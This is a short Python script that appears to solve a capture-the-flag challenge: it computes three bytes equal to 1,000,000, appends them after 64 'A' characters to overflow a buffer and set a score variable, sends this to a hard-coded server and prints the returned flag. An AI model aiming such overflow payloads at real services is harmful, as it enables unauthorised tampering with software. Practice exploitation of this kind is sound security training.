#!/usr/bin/python3
import socket

def calc():
    chars = [i for i in range(1, 127)]
    for a in chars:
        for b in chars:
            for c in chars:
                product = a + 256*b + 65536*c
                #print(a, b, c, product)
                if product == 1000000:
                    #print(a, b, c)
                    return (a, b, c)
    return -1

def generate_payload(tup):
    payload = ''
    payload += 'A' * 64
    payload += chr(tup[0])
    payload += chr(tup[1])
    payload += chr(tup[2])
    return payload

def connect(payload):
    host = "35.207.132.47"
    port = 22223

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        data = []
        s.connect((host, port))
        #print("Connected to", host)
        header = s.recv(2048).decode("ascii")
        #print(header)
        poem_request = s.recv(2048).decode("ascii")
        #print(poem_request)
        s.sendall(b'A\n')
        #print("Sent poem")
        nxt = s.recv(2048).decode("ascii")
        #print(nxt)
        s.sendall(str.encode(payload))
        s.sendall(b'\n')
        score = s.recv(2048).decode("ascii")
        final = s.recv(2048).decode("ascii")
        flag = final.split("FLAG:")[1].split('+')[0].strip()
        print(flag)
    
if __name__ == "__main__":
    nums = calc()
    payload = generate_payload(nums)
    connect(payload)
